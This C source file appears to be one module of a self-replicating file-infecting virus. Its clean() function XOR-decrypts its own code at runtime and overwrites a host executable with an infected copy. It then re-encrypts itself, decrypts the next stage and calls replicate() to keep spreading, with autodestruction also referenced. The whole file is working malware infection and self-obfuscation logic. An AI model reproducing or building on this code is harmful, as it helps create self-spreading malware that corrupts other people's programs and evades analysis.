#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

__attribute__((always_inline)) static inline void decrypt_right(const struct s_keychain *keychain, char *callee, const size_t size)
{
	for (register size_t index = 0; index < size; index++)
		callee[index] ^= keychain->key[RIGHT];
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void clean(struct s_host *host, struct s_keychain *keychain, enum e_context context, struct s_infect *infect)
{
#if LOGGER
	MID_LOGGER("clean:\t\t\t");
#endif

	decrypt_right(keychain, (char *)sign, (void *)clean - (void *)sign);

	if (context == FAILURE)
		goto label;

	if ((infect->fd = _open(host->filename, O_RDWR | O_TRUNC, 0000)) < 0)
	{
		context = FAILURE;
		goto label;
	}

	_write(infect->fd, infect->ptr, infect->filesize);
	_close(infect->fd);
	_munmap(infect->ptr, infect->filesize);
	_munmap(host->header, host->filesize);

label:
	update_keychain_right(keychain, (char *)clean, (void *)replicate - (void *)clean);
	decrypt_right(keychain, (char *)replicate, (void *)autodestruction - (void *)replicate);

	replicate(host, keychain, context);
}
